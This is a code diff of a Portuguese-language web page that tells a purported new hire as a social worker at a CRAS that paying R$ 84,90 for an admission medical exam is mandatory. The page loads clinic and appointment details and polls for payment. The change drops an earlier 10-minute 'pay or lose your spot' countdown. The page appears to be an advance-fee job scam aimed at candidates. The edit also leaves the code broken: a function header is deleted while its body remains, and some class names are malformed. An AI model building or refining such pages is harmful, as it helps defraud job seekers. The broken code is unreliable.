@@ -87,25 +87,15 @@
     <!-- Main Content -->
     <section class="py-10 md:py-14">
         <div class="container mx-auto px-4 md:px-8 text-center">
-            <h2 class="text-lg md:text-xl font-bold mb-1 leading-tight">Pagamento do Exame Admissional</h2>
+            <h2 class="text-lg md:text-xl font-bold mb-1 leading-tight">Confirme seu Exame Admissional</h2>
             <div class="w-24 h-2 bg-[#044785] mx-auto mb-3 rounded-full"></div>
-            <!-- Countdown Timer -->
-            <div class="bg-red-50 border border-red-200 rounded-lg p-4 mb-6 max-w-md mx-auto">
-                <div class="text-center">
-                    <h3 class="text-lg font-bold text-red-800 mb-2">⏰ TEMPO LIMITE PARA PAGAMENTO</h3>
-                    <p class="text-red-700 text-sm mb-3">Você tem <strong>10 minutos</strong> para efetuar o pagamento ou perderá sua vaga!</p>
-                    <div id="countdown-timer" class="text-2xl font-bold text-red-600 bg-white p-3 rounded-lg">
-                        10:00
-                    </div>
-                </div>
-            </div>
-            
-            <p class="max-w-3xl mx-auto mb-6 md:mb-10 leading-relaxed text-sm">
-                Para confirmar sua contratação como Assistente Social no CRAS, é obrigatório o pagamento do exame médico admissional. O valor é de <span class="font-bold text-red-600">R$ 84,90</span>.
+ 
+            <p class="max-w-3xl mx-auto mb-6 md:mb-10 leading-relaxed text-2sm">
+                Para confirmar sua contratação como Assistente Social no CRAS, é obrigatório o pagamento do exame médico admissional. O valor é de <strong>R$ 84,90</strong></span>.
             </p>
             
             <div id="clinicInfo" class="bg-blue-50 border-l-4 border-blue-500 p-4 mb-6 rounded-r-lg max-w-2xl mx-auto" style="display: none;">
-                <h3 class="font-semibold text-blue-800 mb-2">📍 Local do Exame:</h3>
+                <h3 class="font-semibold text-blue-800 mb-2">Local do Exame:</h3>
                 <p id="clinicName" class="text-blue-700 font-medium"></p>
                 <p id="clinicAddress" class="text-blue-600 text-sm"></p>
                 <p id="clinicPhone" class="text-blue-600 text-sm"></p>
@@ -116,8 +106,8 @@
                 <!-- Payment Status Box -->
                 <div class="bg-gray-100 border border-gray-300 rounded-lg p-4 mb-6 w-full max-w-2xl mx-auto">
                     <div class="flex items-center justify-center space-x-2 mb-4">
-                        <div class="w-6 h-6 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
-                        <span class="text-blue-600 font-medium text-sm">Aguardando pagamento para finalizar</span>
+                        <div class="w-6 h-6 border-4 border--gray-700 border-t-transparent rounded-full animate-spin"></div>
+                        <span class="text--gray-700 font-medium text-sm">Aguardando pagamento para finalizar</span>
                     </div>
                     <div class="border-t border-gray-300 pt-4 text-left">
                         <p class="text-sm text-gray-700 mb-3" id="training-info">
@@ -306,8 +296,57 @@
         updateTimer();
         setInterval(updateTimer, 1000);
         
+        // Load clinic and appointment data
+        function loadClinicAndAppointmentInfo() {
+            try {
+                // Get clinic data
+                const clinicDataStr = localStorage.getItem('clinicLocation');
+                const clinicData = clinicDataStr ? JSON.parse(clinicDataStr) : null;
+                
+                // Get appointment data
+                const examDate = localStorage.getItem('examDate');
+                const examTime = localStorage.getItem('examTime');
+                
+                console.log('Clinic data:', clinicData);
+                console.log('Exam date:', examDate);
+                console.log('Exam time:', examTime);
+                
+                if (clinicData) {
+                    const clinicNameEl = document.getElementById('clinicName');
+                    const clinicAddressEl = document.getElementById('clinicAddress');
+                    const clinicPhoneEl = document.getElementById('clinicPhone');
+                    
+                    if (clinicNameEl) clinicNameEl.textContent = clinicData.nome || 'Nome não informado';
+                    if (clinicAddressEl) clinicAddressEl.textContent = clinicData.endereco || 'Endereço não informado';
+                    if (clinicPhoneEl) clinicPhoneEl.textContent = `Telefone: ${clinicData.telefone || 'Não informado'}`;
+                }
+                
+                if (examDate && examTime) {
+                    const examDateTimeEl = document.getElementById('examDateTime');
+                    if (examDateTimeEl) {
+                        examDateTimeEl.textContent = `${examDate} às ${examTime}`;
+                    }
+                } else if (examDate) {
+                    const examDateTimeEl = document.getElementById('examDateTime');
+                    if (examDateTimeEl) {
+                        examDateTimeEl.textContent = `${examDate} (horário a definir)`;
+                    }
+                }
+                
+                // Show clinic info if we have data
+                if (clinicData || examDate) {
+                    const clinicInfoEl = document.getElementById('clinicInfo');
+                    if (clinicInfoEl) {
+                        clinicInfoEl.style.display = 'block';
+                    }
+                }
+                
+            } catch (error) {
+                console.error('Erro ao carregar informações da clínica/agendamento:', error);
+            }
+        }
+
         // Load clinic information
-        function loadClinicInfo() {
             try {
                 const clinicData = localStorage.getItem('clinicLocation');
                 if (clinicData) {
@@ -430,6 +469,9 @@
         
         // Start automatic payment checking when page loads
         document.addEventListener('DOMContentLoaded', function() {
+            // Load clinic and appointment information first
+            loadClinicAndAppointmentInfo();
+            
             // Start checking immediately for fastest redirection
             setTimeout(() => {
                 startPaymentStatusCheck();
